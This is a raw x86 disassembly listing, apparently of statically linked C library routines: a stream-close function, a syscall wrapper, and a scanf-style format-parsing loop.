sub esp, 0x1c
mov ebx, dword [arg_8h]
test byte [ebx + 1], 0x20
jne 0x8049f12
movzx edx, word [ebx]
xor esi, esi
test dx, dx
js 0x8049e08
mov eax, 0
test eax, eax
je 0x8049e08
lea eax, [var_1ch]
mov dword [var_8h], ebx
mov dword [var_4h], fcn.08074580
mov dword [esp], eax
mov esi, 1
call section.
movzx edx, word [ebx]
test dx, dx
jns 0x8049f05
mov eax, dword [ebx]
test ah, 0x20
jne 0x8049ef6
test al, 0x20
sete al
movzx edi, al
dec edi
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
mov dword [var_4h], 0
call dword [eax + 8]
cmp word [ebx], 0
jns 0x8049ee9
test esi, esi
jne 0x8049ed1
mov edx, dword [ebx + 0x5c]
test edx, edx
jle 0x8049ec0
mov eax, 0
mov esi, dword [ebx + 0x54]
test eax, eax
je 0x8049e6a
mov dword [esp], 0x80aac88
call section.
mov eax, dword [esi + 0x24]
call fcn.08056690
mov eax, dword [esi + 0x50]
call fcn.08056690
mov eax, 0
test eax, eax
je 0x8049e8f
mov dword [esp], 0x80aac88
call section.
cmp ebx, dword [0x80a94fc]
je 0x8049eb5
cmp ebx, dword [0x80a9500]
je 0x8049eb5
cmp ebx, dword [0x80a9504]
je 0x8049eb5
mov dword [ebx], 0
mov dword [esp], ebx
call fcn.08051180
add esp, 0x1c
mov eax, edi
pop ebx
pop esi
pop edi
leave
ret
nop
mov eax, dword [ebx + 0x24]
test eax, eax
je 0x8049e8f
mov dword [esp], ebx
call fcn.0804d7f0
jmp 0x8049e8f
lea eax, [var_1ch]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
jmp 0x8049e4b
mov dword [esp], ebx
call fcn.08074580
jmp 0x8049e43
mov dword [esp], ebx
call fcn.0804b620
mov edi, eax
jmp 0x8049e25
mov dword [esp], ebx
call fcn.08074540
jmp 0x8049e11
mov dword [esp], ebx
call fcn.0804d500
jmp 0x8049dd6
mov edx, ebx
mov ecx, dword [arg_8h]
mov ebx, dword [arg_4h]
mov eax, 0xf
int 0x80
mov ebx, edx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
push ebp
mov ebp, esp
sub esp, 0xc
lea eax, [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0804a280
leave
ret
push ebp
mov ebp, esp
sub esp, 0xb8
mov dword [var_4h], ebx
mov dword [var_10h], 0
mov dword [var_ch], 0
lea ebx, [var_a4h]
mov dword [var_5ch], 0
mov dword [var_8h], 0xffffffff
mov dword [esp], ebx
mov dword [var_sp_4h], 0x8000
call fcn.0804e030
mov eax, dword [arg_8h]
mov dword [esp], ebx
mov dword [var_bp_10h], 0x8092c20
mov dword [var_ch], 0
mov dword [var_8h], 0
mov dword [var_sp_4h], eax
call fcn.0804e940
mov eax, dword [arg_10h]
mov dword [esp], ebx
mov dword [var_ch], 0
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
call fcn.0806f500
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 0x1c
mov eax, dword [arg_10h]
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, dword [arg_8h]
mov esi, dword [arg_ch]
test eax, eax
je 0x804e9c0
lea eax, [eax + esi]
mov edi, 0xffffffff
cmp eax, esi
cmova edi, eax
mov dword [var_sp_ch], 0
mov dword [var_sp_8h], edi
mov dword [var_sp_4h], esi
mov dword [esp], ebx
call fcn.0804db40
mov eax, dword [arg_14h]
mov dword [ebx + 0x10], esi
mov dword [ebx + 0xc], esi
mov dword [ebx + 4], esi
test eax, eax
je 0x804e9b2
mov eax, dword [arg_14h]
mov dword [ebx + 0x18], edi
mov dword [ebx + 0x14], eax
mov dword [ebx + 8], eax
mov dword [ebx + 0x98], 0
mov edi, dword [var_4h]
mov esi, dword [var_8h]
mov ebx, dword [var_ch]
leave
ret
mov dword [ebx + 0x14], esi
mov dword [ebx + 0x18], esi
mov dword [ebx + 8], edi
jmp 0x804e99d
lea esi, [esi]
mov dword [var_sp_4h], 0
mov dword [esp], esi
call fcn.080537a0
mov edi, eax
jmp 0x804e969
push ebp
mov eax, 0
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10c
test eax, eax
mov dword [var_a8h], 0
mov ebx, dword [arg_ch]
mov dword [var_94h], 0
mov dword [var_98h], 0
mov dword [var_9ch], 0
mov dword [var_90h], ebx
je 0x80744b0
mov dword [esp], 3
call section.
mov dword [var_ach_2], eax
mov ecx, dword [var_ach]
mov eax, dword [var_sp_ch]
mov dword [var_b4h], 0
mov dword [var_d4h], 0
mov dword [var_d8h], 0
mov dword [var_dch], 0
mov dword [var_e0h], 0
mov dword [var_e4h], 0
mov dword [var_ech], 0
mov ecx, dword [ecx]
mov dword [var_f0h], 0
mov dword [var_8ch], eax
mov dword [var_b0h], ecx
mov ecx, dword [var_4h]
mov edx, dword [ecx + 0x5c]
test edx, edx
jne 0x806f5d9
mov dword [ecx + 0x5c], 0xffffffff
mov edx, 0xffffffff
inc edx
mov eax, 0xffffffff
jne 0x806f74c
mov eax, dword [arg_8h]
test byte [eax], 4
jne 0x80744a3
test ebx, ebx
je 0x807448e
mov edx, dword [var_ach]
mov eax, dword [edx + 4]
mov edx, dword [var_e4h]
mov ecx, dword [eax + 0x24]
mov dword [var_c4h], ecx
mov eax, dword [eax + 0x28]
cmp byte [eax], 0
cmovne edx, eax
mov eax, 0
test eax, eax
mov dword [var_c8h], edx
setne al
movzx eax, al
test eax, eax
mov dword [var_f8h], eax
jne 0x807446f
mov eax, dword [arg_8h]
cmp word [eax], 0
jns 0x8074462
mov dword [var_64h], 0
mov dword [var_60h], 0
movzx eax, byte [ebx]
test al, al
je 0x806f721
mov ebx, eax
test bl, 0x80
jne 0x8074374
inc dword [var_90h]
cmp bl, 0x25
je 0x806f95d
mov ecx, dword [var_ach_2]
movzx edx, bl
mov eax, dword [ecx + 0x34]
test byte [eax + edx*2 + 1], 0x20
je 0x806f7af
mov dword [var_e4h_2], 1
mov edx, dword [var_90h]
movzx eax, byte [edx]
test al, al
mov ebx, eax
jne 0x806f663
mov ecx, dword [var_e4h]
test ecx, ecx
je 0x806f721
cmp dword [var_9ch], 0xffffffff
je 0x806f798
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x806f785
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x806f773
mov edx, dword [var_9ch]
mov ecx, dword [var_ach]
mov dword [var_9ch], edx
mov eax, dword [ecx + 0x34]
test byte [eax + edx*2 + 1], 0x20
jne 0x806f6b5
cmp edx, 0xffffffff
je 0x806f721
movzx eax, dl
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0804e190
mov ecx, dword [arg_8h]
cmp word [ecx], 0
jns 0x806f769
mov edx, dword [var_f8h]
test edx, edx
jne 0x806f754
mov eax, dword [arg_14h]
test eax, eax
je 0x806f746
mov eax, dword [arg_14h]
mov edx, dword [var_a8h]
or dword [eax], edx
mov eax, dword [var_94h]
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
lea eax, [var_1ch]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
jmp 0x806f734
mov dword [esp], ecx
call fcn.08074580
jmp 0x806f72a
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x806f6ee
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x806f6e1
call fcn.08048b20
mov edx, 0xffffffff
mov ecx, dword [var_b4h]
mov dword [eax], ecx
jmp 0x806f6f4
cmp dword [var_9ch_2], 0xffffffff
je 0x806f946
mov ecx, dword [var_4h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x806f933
movzx edx, byte [eax]
mov ecx, dword [var_4h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch_2], edx
cmp dword [var_9ch_2], 0xffffffff
je 0x806f921
inc dword [var_98h_2]
mov eax, dword [var_9ch_2]
mov dword [var_9ch_2], eax
inc eax
je 0x806f8c6
mov eax, dword [var_e4h_2]
test eax, eax
je 0x806f889
mov edx, dword [var_ach_2]
mov ecx, dword [var_9ch_2]
mov eax, dword [edx + 0x34]
test byte [eax + ecx*2 + 1], 0x20
je 0x806f87f
cmp dword [var_9ch_2], 0xffffffff
je 0x806f912
mov ecx, dword [var_4h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x806f8ff
movzx edx, byte [eax]
mov ecx, dword [var_4h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch_2], edx
cmp dword [var_9ch_2], 0xffffffff
je 0x806f8ed
inc dword [var_98h_2]
cmp dword [var_9ch_2], 0xffffffff
je 0x806f8c6
mov edx, dword [var_ach_2]
mov ecx, dword [var_9ch_2]
mov eax, dword [edx + 0x34]
test byte [eax + ecx*2 + 1], 0x20
jne 0x806f821
mov dword [var_e4h_2], 0
movzx eax, bl
cmp dword [var_9ch_2], eax
je 0x806f69c
cmp dword [var_9ch], 0xffffffff
je case.0x806fb57.38
movzx eax, byte [var_9ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0804e190
mov dword [var_a8h], 2
jmp 0x806f721
mov esi, dword [var_94h]
mov dword [var_a8h], 1
test esi, esi
jne 0x806f721
mov dword [var_94h], 0xffffffff
jmp 0x806f721
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h_2], eax
jmp 0x806f860
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch_2], eax
jmp 0x806f84d
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
jmp 0x806f8c6
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h_2], eax
jmp 0x806f7ee
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch_2], eax
jmp 0x806f7db
call fcn.08048b20
mov edx, dword [var_b4h_2]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x806f7f4
mov edx, dword [var_90h]
mov dword [var_a4h], 0
mov dword [var_e8h], 0
mov dword [var_fch], 0
mov dword [var_f4h], 0
movzx ebx, byte [edx]
movzx eax, bl
sub eax, 0x30
cmp eax, 9
ja 0x80742a0
inc edx
mov dword [var_fch_2], eax
mov dword [var_90h_2], edx
movzx ebx, byte [edx]
movzx eax, bl
mov ecx, ebx
sub eax, 0x30
cmp eax, 9
ja 0x806f9f2
lea esi, [esi]
mov eax, dword [var_fch_2]
inc dword [var_90h_2]
lea edx, [eax + eax*4]
movzx eax, cl
lea edx, [eax + edx*2 - 0x30]
mov dword [var_fch_2], edx
mov edx, dword [var_90h_2]
movzx ebx, byte [edx]
movzx eax, bl
mov ecx, ebx
sub eax, 0x30
cmp eax, 9
jbe 0x806f9c0
cmp bl, 0x24
je 0x8074291
mov eax, dword [var_fch_2]
mov dword [var_a4h_2], 0x40
mov dword [var_fch_2], 0
mov dword [var_a0h_2], eax
mov eax, dword [var_a0h_2]
test eax, eax
jne 0x806fa2f
mov dword [var_a0h], 0xffffffff
movsx eax, bl
inc dword [var_90h]
sub eax, 0x4c
cmp eax, 0x2e
ja case.0x806fa44.77
jmp dword [eax*4 + str.iB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_bB_a_b]
mov edx, dword [var_90h_2]
movzx ebx, byte [edx]
cmp bl, 0x68
je 0x80741e7
or dword [var_a4h_2], 4
test bl, bl
je case.0x806fb57.38
mov eax, dword [var_e4h]
inc dword [var_90h]
test eax, eax
jne 0x806faa0
cmp bl, 0x5b
je 0x806fb48
cmp bl, 0x63
je 0x806fb48
cmp bl, 0x43
je 0x806fb48
cmp bl, 0x6e
je 0x806fb48
call fcn.08048b20
mov esi, dword [eax]
mov dword [eax], 0
lea esi, [esi]
cmp dword [var_9ch], 0xffffffff
je 0x80741d8
mov edx, dword [var_4h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x80741c5
movzx ecx, byte [eax]
mov edx, dword [var_4h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch_2], ecx
cmp dword [var_9ch_2], 0xffffffff
je 0x80741b3
inc dword [var_98h_2]
cmp dword [var_9ch_2], 0xffffffff
je 0x80741a0
mov ecx, dword [var_ach]
mov edx, dword [var_9ch]
mov eax, dword [ecx + 0x34]
test byte [eax + edx*2 + 1], 0x20
jne 0x806fab0
call fcn.08048b20
cmp dword [var_9ch], 0xffffffff
mov dword [eax], esi
je 0x806fb3e
movzx eax, byte [var_9ch_2]
mov ecx, dword [var_4h]
dec dword [var_98h_2]
mov dword [esp], ecx
mov dword [var_4h], eax
call fcn.0804e190
mov dword [var_e4h], 0
movzx eax, bl
sub eax, 0x25
cmp eax, 0x53
ja case.0x806fb57.38
jmp dword [eax*4 + 0x80a17ac]
cmp dword [var_9ch], 0xffffffff
je 0x806fbd7
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x806fbc7
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x806fbb8
inc dword [var_98h]
mov eax, dword [var_9ch]
mov dword [var_9ch], eax
inc eax
je 0x806f8c6
movzx eax, bl
cmp dword [var_9ch], eax
je 0x806f69c
jmp 0x806f8a1
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x806fb91
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x806fb82
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x806fb97
test byte [var_a4h], 8
jne 0x806fc25
mov eax, dword [var_fch]
test eax, eax
jne 0x806fe27
mov eax, dword [var_8ch]
add dword [var_8ch], 4
mov eax, dword [eax]
mov dword [var_d8h], eax
mov eax, dword [var_d8h]
test eax, eax
je case.0x806fb57.38
cmp dword [var_9ch], 0xffffffff
je 0x806fe10
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x806fdfd
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x806fdeb
inc dword [var_98h]
mov eax, dword [var_9ch]
mov dword [var_9ch], eax
inc eax
je 0x806f8c6
mov dword [var_6ch], 0
lea ebx, [var_6ch]
mov dword [var_68h], 0
lea esi, [var_6dh]
movzx eax, byte [var_9ch]
mov byte [var_6dh], al
mov dword [var_sp_ch], ebx
test byte [var_a4h], 8
mov dword [var_8h], 1
mov dword [var_4h], esi
mov eax, dword [var_d8h]
je 0x806fcb6
xor eax, eax
mov dword [esp], eax
call fcn.08077900
cmp eax, 0xfffffffe
jne 0x806fd4b
cmp dword [var_9ch], 0xffffffff
je 0x806fd3c
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x806fd2c
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x806fd1d
inc dword [var_98h]
cmp dword [var_9ch], 0xffffffff
jne 0x806fc8b
mov dword [var_a8h], 4
call fcn.08048b20
mov dword [eax], 0x54
jmp 0x806f721
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x806fcfa
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x806fceb
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
jmp 0x806fd03
dec eax
jne 0x806fd03
dec dword [var_a0h]
add dword [var_d8h], 4
mov eax, dword [var_a0h]
test eax, eax
jle 0x806fda5
cmp dword [var_9ch], 0xffffffff
je 0x806fddc
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x806fdcc
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x806fdbd
inc dword [var_98h]
cmp dword [var_9ch], 0xffffffff
jne 0x806fc8b
test byte [var_a4h], 8
jne 0x806f69c
inc dword [var_94h]
jmp 0x806f69c
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x806fd98
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x806fd89
call fcn.08048b20
mov ecx, dword [var_b4h]
mov dword [eax], ecx
jmp 0x806fda5
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x806fc64
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x806fc51
call fcn.08048b20
mov ecx, dword [var_b4h]
mov dword [eax], ecx
mov eax, 0xffffffff
jmp 0x806fc6a
mov edx, dword [var_fch]
mov eax, dword [arg_10h]
dec edx
je 0x806fc0f
add eax, 4
dec edx
jne 0x806fe37
jmp 0x806fc0f
test byte [var_a4h], 8
jne 0x806febe
test dword [var_a4h], 0x100
je 0x8070257
mov ecx, dword [var_fch]
test ecx, ecx
jne 0x807023c
mov eax, dword [var_8ch]
add dword [var_8ch], 4
mov eax, dword [eax]
mov dword [var_dch], eax
mov edx, dword [var_dch]
test edx, edx
je case.0x806fb57.38
mov dword [var_e0h], 0x64
mov dword [esp], 0x190
call fcn.08050fe0
mov edx, dword [var_dch]
mov dword [edx], eax
mov dword [var_d8h], eax
mov eax, dword [var_d8h]
test eax, eax
je case.0x806fb57.38
cmp dword [var_9ch], 0xffffffff
je 0x8070225
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x8070212
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x8070200
inc dword [var_98h]
mov eax, dword [var_9ch]
mov dword [var_9ch], eax
inc eax
je 0x806f8c6
mov dword [var_78h], 0
lea esi, [var_78h]
mov dword [var_74h], 0
mov ecx, dword [var_ach]
mov edx, dword [var_9ch]
mov eax, dword [ecx + 0x34]
test byte [eax + edx*2 + 1], 0x20
jne 0x80701df
mov byte [var_79h], dl
lea ebx, [var_79h]
test byte [var_a4h], 8
mov dword [var_sp_ch], esi
mov dword [var_8h], 1
mov dword [var_4h], ebx
mov eax, dword [var_d8h]
je 0x806ff62
xor eax, eax
mov dword [esp], eax
call fcn.08077900
cmp eax, 0xfffffffe
jne 0x806ffec
cmp dword [var_9ch], 0xffffffff
je 0x806ffda
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x806ffca
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x806ffbb
inc dword [var_98h]
cmp dword [var_9ch], 0xffffffff
je 0x806fd03
movzx ecx, byte [var_9ch]
mov byte [var_79h], cl
jmp 0x806ff41
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x806ffa2
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x806ff93
call fcn.08048b20
mov ecx, dword [var_b4h]
mov dword [eax], ecx
jmp 0x806fd03
dec eax
jne 0x806fd03
add dword [var_d8h], 4
mov eax, dword [var_a4h]
and eax, 0x108
cmp eax, 0x100
je 0x8070123
mov eax, dword [var_a0h]
test eax, eax
jle 0x807002a
dec dword [var_a0h]
mov eax, dword [var_a0h]
test eax, eax
jle 0x8070076
cmp dword [var_9ch], 0xffffffff
je 0x8070111
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x80700fe
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x80700ec
inc dword [var_98h]
cmp dword [var_9ch], 0xffffffff
jne 0x806ff21
test byte [var_a4h], 8
jne 0x806f69c
mov ecx, dword [var_d8h]
mov dword [ecx], 0
add ecx, 4
test dword [var_a4h], 0x100
mov dword [var_d8h], ecx
je 0x806fdb2
mov eax, dword [var_dch]
mov edx, ecx
sub edx, dword [eax]
mov eax, edx
sar eax, 2
cmp eax, dword [var_e0h]
je 0x806fdb2
mov dword [var_4h], edx
mov edx, dword [var_dch]
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08051220
test eax, eax
je 0x806fdb2
mov ecx, dword [var_dch]
mov dword [ecx], eax
jmp 0x806fdb2
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8070069
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8070056
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
jmp 0x8070076
mov edx, dword [var_dch]
mov ebx, dword [var_e0h]
mov eax, dword [edx]
shl ebx, 2
add eax, ebx
cmp dword [var_d8h], eax
jne 0x8070010
mov eax, dword [var_e0h]
shl eax, 3
mov dword [var_4h], eax
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov dword [var_d8h], eax
je 0x8070184
mov eax, dword [var_d8h]
mov ecx, dword [var_dch]
shl dword [var_e0h], 1
mov dword [ecx], eax
add eax, ebx
mov dword [var_d8h], eax
jmp 0x8070010
mov ecx, dword [var_dch]
lea eax, [ebx + 4]
mov dword [var_4h], eax
mov eax, dword [ecx]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov dword [var_d8h], eax
je 0x80701be
add dword [var_d8h], ebx
inc dword [var_e0h]
mov edx, dword [var_dch]
mov dword [edx], eax
jmp 0x8070010
mov ecx, dword [var_dch]
mov edx, dword [var_e0h]
mov eax, dword [ecx]
mov dword [eax + edx*4 - 4], 0
inc dword [var_94h]
jmp case.0x806fb57.38
movzx eax, byte [var_9ch]
mov ecx, dword [arg_8h]
dec dword [var_98h]
mov dword [esp], ecx
mov dword [var_4h], eax
call fcn.0804e190
jmp 0x8070076
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x806fefd
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x806feea
call fcn.08048b20
mov ecx, dword [var_b4h]
mov dword [eax], ecx
mov eax, 0xffffffff
jmp 0x806ff03
mov edx, dword [var_fch]
mov eax, dword [arg_10h]
dec edx
je 0x806fe76
add eax, 4
dec edx
jne 0x807024c
jmp 0x806fe76
mov eax, dword [var_fch]
test eax, eax
jne 0x8070275
mov eax, dword [var_8ch]
add dword [var_8ch], 4
mov eax, dword [eax]
jmp 0x806feaa
mov edx, dword [var_fch]
mov eax, dword [arg_10h]
dec edx
je 0x807026e
add eax, 4
dec edx
jne 0x8070281
jmp 0x807026e
test byte [var_a4h], 1
je 0x8070a2f
test byte [var_a4h_2], 8
jne 0x8070312
test dword [var_a4h_2], 0x100
je 0x80709fd
mov esi, dword [var_fch_2]
test esi, esi
jne 0x80709e2
mov eax, dword [var_8ch_2]
add dword [var_8ch_2], 4
mov eax, dword [eax]
mov dword [var_dch_2], eax
mov ebx, dword [var_dch_2]
test ebx, ebx
je case.0x806fb57.38
mov dword [var_e0h_2], 0x64
mov dword [esp], 0x190
call fcn.08050fe0
mov ecx, dword [var_dch_2]
mov dword [ecx], eax
mov dword [var_d8h_2], eax
mov edx, dword [var_d8h_2]
test edx, edx
je case.0x806fb57.38
mov ecx, dword [var_90h]
cmp byte [ecx], 0x5e
je 0x80709cf
mov byte [var_b8h_2], 0
mov eax, dword [var_a0h]
test eax, eax
mov eax, 0x7fffffff
cmovns eax, dword [var_a0h]
cmp dword [var_f0h], 0xff
mov dword [var_a0h], eax
ja 0x807036b
sub esp, 0x110
mov dword [var_f0h_2], 0x100
lea eax, [var_1fh_4]
and eax, 0xfffffff0
mov dword [var_ech_2], eax
mov edx, dword [var_ech]
mov dword [var_8h], 0x100
mov dword [var_4h], 0
mov dword [esp], edx
call fcn.080536f0
mov ecx, dword [var_90h]
movzx ebx, byte [ecx]
cmp bl, 0x5d
je 0x80709ae
cmp bl, 0x2d
je 0x80709ae
inc dword [var_90h]
mov edx, ebx
test bl, bl
je case.0x806fb57.38
cmp bl, 0x5d
je 0x80703ed
cmp bl, 0x2d
je 0x8070960
movzx eax, dl
mov edx, dword [var_ech_2]
mov byte [eax + edx], 1
mov ecx, dword [var_90h_2]
movzx ebx, byte [ecx]
inc dword [var_90h_2]
mov edx, ebx
test bl, bl
je case.0x806fb57.38
cmp bl, 0x5d
jne 0x80703b9
test bl, bl
je case.0x806fb57.38
test byte [var_a4h], 1
je 0x8070708
xor esi, esi
mov edi, dword [var_98h]
cmp dword [var_9ch], 0xffffffff
je 0x806f912
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x80706f5
movzx edx, byte [eax]
mov ecx, dword [var_4h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch_2], edx
cmp dword [var_9ch], 0xffffffff
je 0x80706e3
inc dword [var_98h_2]
cmp dword [var_9ch], 0xffffffff
je 0x806f8c6
mov dword [var_88h], 0
mov dword [var_84h], 0
mov eax, dword [var_ech]
mov edx, dword [var_9ch]
movzx ecx, byte [var_b8h]
cmp byte [edx + eax], cl
je 0x80706c2
test byte [var_a4h], 8
je 0x80705aa
dec dword [var_a0h_2]
mov eax, dword [var_a0h_2]
test eax, eax
jle 0x80704ef
cmp dword [var_9ch], 0xffffffff
je 0x8070598
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8070585
movzx edx, byte [eax]
mov ecx, dword [arg_8h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch], edx
cmp dword [var_9ch], 0xffffffff
je 0x8070573
inc dword [ebp - 0x98]
cmp dword [ebp - 0x9c], 0xffffffff
jne 0x807046a
test esi, esi
jne 0x806fd03
cmp edi, dword [var_98h]
je case.0x806fb57.38
test byte [var_a4h], 8
jne 0x806f69c
mov eax, dword [var_d8h]
mov dword [eax], 0
add eax, 4
test dword [var_a4h], 0x100
mov dword [var_d8h], eax
je 0x806fdb2
mov ecx, dword [var_dch]
mov edx, eax
sub edx, dword [ecx]
mov eax, edx
sar eax, 2
cmp eax, dword [var_e0h]
je 0x806fdb2
mov dword [var_4h], edx
mov eax, dword [ecx]
mov dword [esp], eax
call fcn.08051220
test eax, eax
je 0x806fdb2
mov edx, dword [var_dch]
mov dword [edx], eax
jmp 0x806fdb2
call fcn.08048b20
mov eax, dword [eax]
mov dword [ebp - 0xb4], eax
jmp 0x80704e2
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x80704cf
call fcn.08048b20
mov edx, dword [var_b4h]
mov dword [eax], edx
jmp 0x80704ef
lea eax, [var_5ch]
lea ecx, [var_88h]
mov byte [var_5ch], dl
mov dword [var_4h], eax
mov dword [var_sp_ch], ecx
mov dword [var_8h], 1
mov eax, dword [var_d8h]
mov dword [esp], eax
call fcn.08077900
cmp eax, 0xfffffffe
je 0x8070695
xor esi, esi
add dword [var_d8h_2], 4
test dword [var_a4h_2], 0x100
je 0x8070493
mov ecx, dword [var_dch_2]
mov ebx, dword [var_e0h_2]
mov eax, dword [ecx]
shl ebx, 2
add eax, ebx
cmp dword [var_d8h_2], eax
jne 0x8070493
mov eax, dword [var_e0h_2]
shl eax, 3
mov dword [var_4h], eax
mov eax, dword [ecx]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov dword [var_d8h_2], eax
je 0x8070657
mov edx, dword [var_d8h_2]
mov eax, dword [var_dch_2]
shl dword [var_e0h_2], 1
mov dword [eax], edx
add edx, ebx
mov dword [var_d8h_2], edx
jmp 0x8070493
mov edx, dword [var_dch_2]
lea eax, [ebx + 4]
mov dword [var_4h], eax
mov eax, dword [edx]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov dword [var_d8h_2], eax
je 0x80701be
add dword [var_d8h_2], ebx
inc dword [var_e0h_2]
mov ecx, dword [var_dch_2]
mov dword [ecx], eax
jmp 0x8070493
mov edx, 0
inc esi
test edx, edx
je 0x80706bb
mov dword [esp], 3
call section.
mov eax, dword [eax]
cmp esi, dword [eax + 0x58]
jb 0x80704a3
jmp 0x80744c1
mov eax, dword [0x80a9ab4]
jmp 0x80706ab
movzx eax, byte [var_9ch]
dec dword [var_98h]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.0804e190
jmp 0x80704ef
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h], eax
jmp 0x8070449
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch], eax
jmp 0x8070436
cmp dword [var_9ch], 0xffffffff
mov esi, dword [var_98h]
je 0x807094e
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
cmp eax, dword [edx + 8]
jae 0x807093b
movzx ecx, byte [eax]
mov edx, dword [arg_8h]
inc eax
mov dword [edx + 4], eax
mov dword [var_9ch], ecx
cmp dword [var_9ch], 0xffffffff
je 0x8070929
inc dword [var_98h]
cmp dword [var_9ch], 0xffffffff
je 0x806f8c6
